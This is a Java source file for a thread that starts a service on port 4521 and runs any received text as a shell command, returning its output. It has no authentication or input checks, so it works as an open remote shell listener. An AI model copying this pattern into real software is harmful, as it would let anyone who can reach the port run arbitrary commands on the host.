package shell;

/**
 * <pre>
 *     author : YONGHAOZENG
 *     e-mail : 1007687534@qq.com
 *     time   : 2019/09/06
 *     desc   :
 *     version: 1.0
 * </pre>
 */
public class ServicesThread extends Thread {
    private static int ShellPORT = 4521;

    @Override
    public void run() {
        System.out.println("Shell服务已吊起");
        new Service(new Service.ServiceGetText() {
            @Override
            public String getText(String text) {
                if (text.startsWith("666")){
                    return "真JB6";
                }
                try{
                    ServiceShellUtils.ServiceShellCommandResult sr =  ServiceShellUtils.execCommand(text, false);
                    if (sr.result == 0){
                        return "###ShellOK#" + sr.successMsg;
                    } else {
                        return "###ShellError#" + sr.errorMsg;
                    }
                }catch (Exception e){
                    return "###CodeError#" + e.toString();
                }
            }
        },ShellPORT);
    }
}
